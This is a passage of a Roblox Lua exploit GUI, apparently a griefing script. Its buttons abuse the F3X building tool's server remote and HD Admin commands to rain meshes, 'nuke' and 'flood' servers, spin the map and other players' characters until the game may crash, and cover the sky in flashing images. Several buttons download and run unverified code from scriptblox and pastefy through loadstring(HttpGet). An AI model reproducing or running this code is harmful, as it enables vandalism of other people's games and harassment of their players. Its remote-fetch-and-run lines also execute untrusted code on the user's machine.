    for i,v in game.Workspace:GetDescendants() do
        if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
            SetName(v,"eee")
            AddMesh(v)
            SetMesh(v, mesh_id)
            SetTexture(v, texture_id)
            MeshResize(v,Vector3.new(7.8,7.8,7.8))
            SetLocked(v,true)
        end
    end
end


Krab("126946829935761", "95357370318922")

end)
end

local TextButton4 = Instance.new("TextButton")
TextButton4.Name = "TextButton"
TextButton4.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton4.Text = "TrafficConeHax rain"
TextButton4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton4.TextSize = 14
TextButton4.TextWrapped = true
TextButton4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton4.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton4.BorderSizePixel = 2
TextButton4.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton4.Size = UDim2.new(0, 74, 0, 31)
TextButton4.Parent = R[226]

local LocalScript4 = Instance.new("Folder")
LocalScript4.Name = "LocalScript"
LocalScript4.Parent = TextButton4
__S[#__S + 1] = function(...)
local script = LocalScript4
script.Parent.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
			tool = v.Parent
		end
	end

	if tool == nil then
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	end

	local remote = tool.SyncAPI.ServerEndpoint

	function _(args)
		return remote:InvokeServer(unpack(args))
	end

	function SetCollision(part, boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end

	function SetAnchor(boolean, part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end

	local function CreatePart(cf)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = workspace
		}
		return _(args)
	end

	function Resize(part, size, cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end

	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part, meshid, texid, size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://" .. meshid,
					["TextureId"] = "rbxassetid://" .. texid,
					["Scale"] = size
				}
			}
		}
		_(args)
	end

	local function createRainToads()
		while true do
			wait(0.01) -- Here they change the appearance time of the Toads or other meshes
			if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
				local hrpcf = player.Character.HumanoidRootPart.CFrame
				local x = hrpcf.x
				local z = hrpcf.z
				local randint = math.random(-600, 600)
				local randint2 = math.random(-600, 600)
				local xloc = randint + x
				local zloc = randint2 + z
				local cf = player.Character.HumanoidRootPart.CFrame.y + math.random(400, 800)

				local randomRotation = CFrame.Angles(
					math.rad(math.random(0, 0)),
					math.rad(math.random(0, 0)),
					math.rad(math.random(0, 0))
				)

				task.defer(function()
					local part = CreatePart(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc))*randomRotation)
					SetCollision(part, false)
					SetAnchor(false, part)
					AddMesh(part)
					SetMesh(part, "126946829935761","95357370318922",Vector3.new(15, 15, 15)) -- Here put it A custom mesh
				end)
			else
				break
			end
		end
	end

	coroutine.wrap(createRainToads)()
end)
end

local TextButton5 = Instance.new("TextButton")
TextButton5.Name = "TextButton"
TextButton5.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton5.Text = "flood"
TextButton5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton5.TextSize = 14
TextButton5.TextWrapped = true
TextButton5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton5.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton5.BorderSizePixel = 2
TextButton5.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton5.Size = UDim2.new(0, 74, 0, 31)
TextButton5.Parent = R[226]

local LocalScript5 = Instance.new("Folder")
LocalScript5.Name = "LocalScript"
LocalScript5.Parent = TextButton5
__S[#__S + 1] = function(...)
local script = LocalScript5
script.Parent.MouseButton1Click:Connect(function()
	-- credits to anepicaya (i think they skidded ts tho...)
	-- didnt test this ins a real game yet, in studio it didnt work
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-c00lFlood-HD-1.0-HD-Admin-230726"))()
end)
end

local TextButton6 = Instance.new("TextButton")
TextButton6.Name = "TextButton"
TextButton6.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton6.Text = "nuke"
TextButton6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton6.TextSize = 14
TextButton6.TextWrapped = true
TextButton6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton6.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton6.BorderSizePixel = 2
TextButton6.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton6.Size = UDim2.new(0, 74, 0, 31)
TextButton6.Parent = R[226]

local LocalScript6 = Instance.new("Folder")
LocalScript6.Name = "LocalScript"
LocalScript6.Parent = TextButton6
__S[#__S + 1] = function(...)
local script = LocalScript6
script.Parent.MouseButton1Click:Connect(function()
	-- this is nuke f3x made by some random guy on scriptblox so it probably wont work because
	-- people on scriptblox are retarded and cant go 10 minutes without skidding
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://scriptblox.com/raw/F3X-Building-Tools-F3X-Nuke-228319"))()
end)
end

local TextButton7 = Instance.new("TextButton")
TextButton7.Name = "TextButton"
TextButton7.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton7.Text = "headshake"
TextButton7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton7.TextSize = 14
TextButton7.TextWrapped = true
TextButton7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton7.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton7.BorderSizePixel = 2
TextButton7.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton7.Size = UDim2.new(0, 74, 0, 31)
TextButton7.Parent = R[226]

local LocalScript7 = Instance.new("Folder")
LocalScript7.Name = "LocalScript"
LocalScript7.Parent = TextButton7
__S[#__S + 1] = function(...)
local script = LocalScript7
script.Parent.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/V6Fc8n6l/raw"))()
end)

end

local TextButton8 = Instance.new("TextButton")
TextButton8.Name = "TextButton"
TextButton8.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton8.Text = "loop rotate parts (might crash)"
TextButton8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton8.TextSize = 14
TextButton8.TextWrapped = true
TextButton8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton8.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton8.BorderSizePixel = 2
TextButton8.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton8.Size = UDim2.new(0, 74, 0, 31)
TextButton8.Parent = R[226]

local LocalScript8 = Instance.new("Folder")
LocalScript8.Name = "LocalScript"
LocalScript8.Parent = TextButton8
__S[#__S + 1] = function(...)
local script = LocalScript8
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	return nil
end

local trackedParts = {}
local speedX = math.rad(45)
local speedY = math.rad(45)
local speedZ = math.rad(45)

local function rotateAll(syncapi, dt)
	local players = game.Players:GetPlayers()

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") then
			if v.Name == "Sky" or v.Name == "Skybox" then
				continue
			end

			local isPlayerPart = false
			for _, p in ipairs(players) do
				local pChar = p.Character
				if pChar and v:IsDescendantOf(pChar) then
					isPlayerPart = true
					break
				end
			end

			if not isPlayerPart then
				if not trackedParts[v] then
					trackedParts[v] = {
						baseCF = v.CFrame,
						rotX = 0,
						rotY = 0,
						rotZ = 0
					}
				end

				local data = trackedParts[v]
				data.rotX = (data.rotX + speedX * dt) % (math.pi * 2)
				data.rotY = (data.rotY + speedY * dt) % (math.pi * 2)
				data.rotZ = (data.rotZ + speedZ * dt) % (math.pi * 2)

				local nextCF = data.baseCF * CFrame.Angles(data.rotX, data.rotY, data.rotZ)

				task.spawn(function()
					pcall(function()
						syncapi:Invoke("SyncRotate", {
							{
								Part = v,
								CFrame = nextCF
							}
						})
					end)
				end)
			end
		end
	end

	for part in pairs(trackedParts) do
		if not part or not part.Parent then
			trackedParts[part] = nil
		end
	end
end

while true do
	local f3x = getf3x()
	
	if not f3x or not f3x:FindFirstChild("SyncAPI") then
		break
	end

	local syncapi = f3x.SyncAPI
	rotateAll(syncapi, 0.03)
	task.wait(0.03)
end

end)

end

local TextButton9 = Instance.new("TextButton")
TextButton9.Name = "TextButton"
TextButton9.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton9.Text = "loop rotate players        (might crash)"
TextButton9.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton9.TextSize = 14
TextButton9.TextWrapped = true
TextButton9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton9.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton9.BorderSizePixel = 2
TextButton9.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton9.Size = UDim2.new(0, 74, 0, 31)
TextButton9.Parent = R[226]

local LocalScript9 = Instance.new("Folder")
LocalScript9.Name = "LocalScript"
LocalScript9.Parent = TextButton9
__S[#__S + 1] = function(...)
local script = LocalScript9
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	return nil
end

local trackedParts = {}
local speedX = math.rad(60)
local speedY = math.rad(60)
local speedZ = math.rad(60)

local function rotatePlayers(syncapi, dt)
	local players = game.Players:GetPlayers()

	for _, p in ipairs(players) do
		if p ~= player then
			local pChar = p.Character
			if pChar and pChar:FindFirstChild("HumanoidRootPart") then
				for _, v in ipairs(pChar:GetDescendants()) do
					if v:IsA("BasePart") then
						if not trackedParts[v] then
							trackedParts[v] = {
								baseCF = v.CFrame,
								rotX = 0,
								rotY = 0,
								rotZ = 0
							}
						end

						local data = trackedParts[v]
						data.rotX = (data.rotX + speedX * dt) % (math.pi * 2)
						data.rotY = (data.rotY + speedY * dt) % (math.pi * 2)
						data.rotZ = (data.rotZ + speedZ * dt) % (math.pi * 2)

						local nextCF = data.baseCF * CFrame.Angles(data.rotX, data.rotY, data.rotZ)

						task.spawn(function()
							pcall(function()
								syncapi:Invoke("SyncRotate", {
									{
										Part = v,
										CFrame = nextCF
									}
								})
							end)
						end)
					end
				end
			end
		end
	end

	for part in pairs(trackedParts) do
		if not part or not part.Parent or not part.Parent:FindFirstChildOfClass("Humanoid") then
			trackedParts[part] = nil
		end
	end
end

while true do
	local f3x = getf3x()
	
	if not f3x or not f3x:FindFirstChild("SyncAPI") then
		break
	end

	local syncapi = f3x.SyncAPI
	rotatePlayers(syncapi, 0.03)
	task.wait(0.03)
end

end)

end

local TextButton10 = Instance.new("TextButton")
TextButton10.Name = "TextButton"
TextButton10.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton10.Text = "trippy skeleton sky small"
TextButton10.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton10.TextSize = 14
TextButton10.TextWrapped = true
TextButton10.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton10.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton10.BorderSizePixel = 2
TextButton10.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton10.Size = UDim2.new(0, 74, 0, 31)
TextButton10.Parent = R[226]

local LocalScript10 = Instance.new("Folder")
LocalScript10.Name = "LocalScript"
LocalScript10.Parent = TextButton10
__S[#__S + 1] = function(...)
local script = LocalScript10
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

RequestCommand:InvokeServer(";fog 500000")

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for i, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint
local RunService = game:GetService("RunService")

function _(args)
    remote:InvokeServer(unpack(args))
end

function CreatePart(cf, parent)
    local args = {
        [1] = "CreatePart",
        [2] = "Normal",
        [3] = cf,
        [4] = parent
    }
    _(args)
end

function SetAnchor(part, boolean)
    local args = {
        [1] = "SyncAnchor",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Anchored"] = boolean
            }
        }
    }
    _(args)
end

function AddMesh(part)
    local args = {
        [1] = "CreateMeshes",
        [2] = {
            [1] = {
                ["Part"] = part
            }
        }
    }
    _(args)
end

function SetMesh(part, meshid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["MeshId"] = "rbxassetid://" .. meshid
            }
        }
    }
    _(args)
end

function SetTexture(part, texid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["TextureId"] = texid
            }
        }
    }
    _(args)
end

function MeshResize(part, size)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Scale"] = size
            }
        }
    }
    _(args)
end

function SetTransparency(part, value)
    local args = {
        [1] = "SyncTransparency",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Transparency"] = value
            }
        }
    }
    _(args)
end

function SetVertexColor(part, vertexColor)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["VertexColor"] = vertexColor
            }
        }
    }
    _(args)
end

function SyncRotate(part, cf)
    local args = {
        [1] = "SyncRotate",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CFrame"] = cf
            }
        }
    }
    _(args)
end

function DestroyPart(part)
    local args = {
        [1] = "Remove",
        [2] = {
            [1] = part
        }
    }
    _(args)
end

local images = {
    "http://www.roblox.com/asset/?id=169585459",
    "http://www.roblox.com/asset/?id=169585475",
    "http://www.roblox.com/asset/?id=169585485",
    "http://www.roblox.com/asset/?id=169585502",
    "http://www.roblox.com/asset/?id=169585515",
    "http://www.roblox.com/asset/?id=169585502",
    "http://www.roblox.com/asset/?id=169585485",
    "http://www.roblox.com/asset/?id=169585475"
}

local skyPart
local skyLoop
local frameTime = 0.15
local lastUpdate = 0
local rotX, rotY, rotZ = 0, 0, 0
local speedX = math.rad(30)
local speedY = math.rad(30)
local speedZ = math.rad(30)

function CreateSky()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local cf = hrp.CFrame
    local baseCF = CFrame.new(cf.Position + Vector3.new(0, 6, 0))
    CreatePart(baseCF, workspace)

    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and (v.CFrame.Position - baseCF.Position).Magnitude < 0.1 then
            skyPart = v
            SetAnchor(skyPart, true)
            AddMesh(skyPart)
            SetMesh(skyPart, "111891702759441")
            MeshResize(skyPart, Vector3.new(10000, 10000, 10000))
            SetTransparency(skyPart, 1)
            SetVertexColor(skyPart, Vector3.new(3,3,3))

            local index = 1
            rotX, rotY, rotZ = 0, 0, 0
            
            skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
                if not skyPart or not skyPart.Parent then
                    if skyLoop then
                        skyLoop:Disconnect()
                        skyLoop = nil
                    end
                    return
                end

                rotX = (rotX + speedX * deltaTime) % (math.pi * 2)
                rotY = (rotY + speedY * deltaTime) % (math.pi * 2)
                rotZ = (rotZ + speedZ * deltaTime) % (math.pi * 2)
                local nextCF = baseCF * CFrame.Angles(rotX, rotY, rotZ)
                
                SyncRotate(skyPart, nextCF)
                skyPart.CFrame = nextCF

                lastUpdate = lastUpdate + deltaTime
                if lastUpdate >= frameTime then
                    lastUpdate = 0
                    SetTransparency(skyPart, 0)
                    SetTexture(skyPart, images[index])
                    index = index % #images + 1
                end
            end)
        end
    end
end

function ResetSky()
    if skyPart then
        DestroyPart(skyPart)
        skyPart = nil
    end
    if skyLoop then
        skyLoop:Disconnect()
        skyLoop = nil
    end
    CreateSky()
end

player.CharacterAdded:Connect(function(newChar)
    char = newChar
    ResetSky()
end)

if char and char:FindFirstChild("Humanoid") then
    char:WaitForChild("Humanoid").Died:Connect(function()
        ResetSky()
    end)
end

CreateSky()

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

RequestCommand:InvokeServer(";time 0 ;fogcolor black")

end)

end

local TextButton11 = Instance.new("TextButton")
TextButton11.Name = "TextButton"
TextButton11.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton11.Text = "trippy skeleton sky"
TextButton11.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton11.TextSize = 14
TextButton11.TextWrapped = true
TextButton11.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton11.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton11.BorderSizePixel = 2
TextButton11.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton11.Size = UDim2.new(0, 74, 0, 31)
TextButton11.Parent = R[226]

local LocalScript11 = Instance.new("Folder")
LocalScript11.Name = "LocalScript"
LocalScript11.Parent = TextButton11
__S[#__S + 1] = function(...)
local script = LocalScript11
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

RequestCommand:InvokeServer(";unfog")

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for i, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint
local RunService = game:GetService("RunService")

function _(args)
    remote:InvokeServer(unpack(args))
end

function CreatePart(cf, parent)
    local args = {
        [1] = "CreatePart",
        [2] = "Normal",
        [3] = cf,
        [4] = parent
    }
    _(args)
end

function SetAnchor(part, boolean)
    local args = {
        [1] = "SyncAnchor",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Anchored"] = boolean
            }
        }
    }
    _(args)
end

function AddMesh(part)
    local args = {
        [1] = "CreateMeshes",
        [2] = {
            [1] = {
                ["Part"] = part
            }
        }
    }
    _(args)
end

function SetMesh(part, meshid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["MeshId"] = "rbxassetid://" .. meshid
            }
        }
    }
    _(args)
end

function SetTexture(part, texid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["TextureId"] = texid
            }
        }
    }
    _(args)
end

function MeshResize(part, size)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Scale"] = size
            }
        }
    }
    _(args)
end

function SetTransparency(part, value)
    local args = {
        [1] = "SyncTransparency",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Transparency"] = value
            }
        }
    }
    _(args)
end

function SetVertexColor(part, vertexColor)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["VertexColor"] = vertexColor
            }
        }
    }
    _(args)
end

function SyncRotate(part, cf)
    local args = {
        [1] = "SyncRotate",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CFrame"] = cf
            }
        }
    }
    _(args)
end

function DestroyPart(part)
    local args = {
        [1] = "Remove",
        [2] = {
            [1] = part
        }
    }
    _(args)
end

local images = {
    "http://www.roblox.com/asset/?id=169585459",
    "http://www.roblox.com/asset/?id=169585475",
    "http://www.roblox.com/asset/?id=169585485",
    "http://www.roblox.com/asset/?id=169585502",
    "http://www.roblox.com/asset/?id=169585515",
    "http://www.roblox.com/asset/?id=169585502",
    "http://www.roblox.com/asset/?id=169585485",
    "http://www.roblox.com/asset/?id=169585475"
}

local skyPart
local skyLoop
local frameTime = 0.15
local lastUpdate = 0
local rotX, rotY, rotZ = 0, 0, 0
local speedX = math.rad(30)
local speedY = math.rad(30)
local speedZ = math.rad(30)

function CreateSky()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local cf = hrp.CFrame
    local baseCF = CFrame.new(cf.Position + Vector3.new(0, 6, 0))
    CreatePart(baseCF, workspace)

    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and (v.CFrame.Position - baseCF.Position).Magnitude < 0.1 then
            skyPart = v
            SetAnchor(skyPart, true)
            AddMesh(skyPart)
            SetMesh(skyPart, "111891702759441")
            MeshResize(skyPart, Vector3.new(10000, 10000, 10000))
            SetTransparency(skyPart, 1)
            SetVertexColor(skyPart, Vector3.new(3,3,3))

            local index = 1
            rotX, rotY, rotZ = 0, 0, 0
            
            skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
                if not skyPart or not skyPart.Parent then
                    if skyLoop then
                        skyLoop:Disconnect()
                        skyLoop = nil
                    end
                    return
                end

                rotX = (rotX + speedX * deltaTime) % (math.pi * 2)
                rotY = (rotY + speedY * deltaTime) % (math.pi * 2)
                rotZ = (rotZ + speedZ * deltaTime) % (math.pi * 2)
                local nextCF = baseCF * CFrame.Angles(rotX, rotY, rotZ)
                
                SyncRotate(skyPart, nextCF)
                skyPart.CFrame = nextCF

                lastUpdate = lastUpdate + deltaTime
                if lastUpdate >= frameTime then
                    lastUpdate = 0
                    SetTransparency(skyPart, 0)
                    SetTexture(skyPart, images[index])
                    index = index % #images + 1
                end
            end)
        end
    end
end

function ResetSky()
    if skyPart then
        DestroyPart(skyPart)
        skyPart = nil
    end
    if skyLoop then
        skyLoop:Disconnect()
        skyLoop = nil
    end
    CreateSky()
end

player.CharacterAdded:Connect(function(newChar)
    char = newChar
    ResetSky()
end)

if char and char:FindFirstChild("Humanoid") then
    char:WaitForChild("Humanoid").Died:Connect(function()
        ResetSky()
    end)
end

CreateSky()

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

RequestCommand:InvokeServer(";time 0 ;fogcolor black")

end)

end

local TextButton12 = Instance.new("TextButton")
TextButton12.Name = "TextButton"
TextButton12.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton12.Text = "set sky brightness to normal"
TextButton12.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton12.TextSize = 14
TextButton12.TextWrapped = true
TextButton12.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton12.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton12.BorderSizePixel = 2
TextButton12.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton12.Size = UDim2.new(0, 74, 0, 31)
TextButton12.Parent = R[226]

local LocalScript12 = Instance.new("Folder")
LocalScript12.Name = "LocalScript"
LocalScript12.Parent = TextButton12
__S[#__S + 1] = function(...)
local script = LocalScript12
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack

local SKY_MESH = "111891702759441"

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	return nil
end

local f3x = getf3x()
if not f3x then
	warn("no f3x broo")
	return
end

local function isSky(part)
	if not part:IsA("BasePart") then
		return false
	end
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	return mesh ~= nil and mesh.MeshId:match("%d+") == SKY_MESH
end

local tool
for i, v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
for i, v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end

local remote = tool.SyncAPI.ServerEndpoint
function _(args)
	remote:InvokeServer(unpack(args))
end

function SetMesh(part, meshid, vertexColor)
	_({ "SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. meshid, VertexColor = vertexColor } } })
end

function UpdateMeshTextureAndColor(part, texid, vertexColor)
	_({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texid, VertexColor = vertexColor } } })
end

local minScale = math.huge
local smallestSky = nil

for _, v in ipairs(workspace:GetDescendants()) do
	if isSky(v) then
		local mesh = v:FindFirstChildOfClass("SpecialMesh")
		if mesh then
			local currentScale = mesh.Scale.X
			if currentScale < minScale then
				minScale = currentScale
				smallestSky = v
			end
		end
	end
end

if smallestSky then
	local mesh = smallestSky:FindFirstChildOfClass("SpecialMesh")
	local currentTexture = mesh.TextureId:match("%d+") or ""
	local targetColor = Vector3.new(3.5, 3.5, 3.5)

	if currentTexture ~= "" then
		UpdateMeshTextureAndColor(smallestSky, currentTexture, targetColor)
	else
		SetMesh(smallestSky, SKY_MESH, targetColor)
	end
end

end)

end

local TextButton13 = Instance.new("TextButton")
TextButton13.Name = "TextButton"
TextButton13.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton13.Text = "set sky brightness to high"
TextButton13.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton13.TextSize = 14
TextButton13.TextWrapped = true
TextButton13.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton13.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton13.BorderSizePixel = 2
TextButton13.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton13.Size = UDim2.new(0, 74, 0, 31)
TextButton13.Parent = R[226]

local LocalScript13 = Instance.new("Folder")
LocalScript13.Name = "LocalScript"
LocalScript13.Parent = TextButton13
__S[#__S + 1] = function(...)
local script = LocalScript13
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack

local SKY_MESH = "111891702759441"

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	return nil
end

local f3x = getf3x()
if not f3x then
	warn("no f3x broo")
	return
end

local function isSky(part)
	if not part:IsA("BasePart") then
		return false
	end
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	return mesh ~= nil and mesh.MeshId:match("%d+") == SKY_MESH
end

local tool
for i, v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
for i, v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end

local remote = tool.SyncAPI.ServerEndpoint
function _(args)
	remote:InvokeServer(unpack(args))
end

function SetMesh(part, meshid, vertexColor)
	_({ "SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. meshid, VertexColor = vertexColor } } })
end

function UpdateMeshTextureAndColor(part, texid, vertexColor)
	_({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texid, VertexColor = vertexColor } } })
end

local minScale = math.huge
local smallestSky = nil

for _, v in ipairs(workspace:GetDescendants()) do
	if isSky(v) then
		local mesh = v:FindFirstChildOfClass("SpecialMesh")
		if mesh then
			local currentScale = mesh.Scale.X
			if currentScale < minScale then
				minScale = currentScale
				smallestSky = v
			end
		end
	end
end

if smallestSky then
	local mesh = smallestSky:FindFirstChildOfClass("SpecialMesh")
	local currentTexture = mesh.TextureId:match("%d+") or ""
	local targetColor = Vector3.new(7, 7, 7)

	if currentTexture ~= "" then
		UpdateMeshTextureAndColor(smallestSky, currentTexture, targetColor)
	else
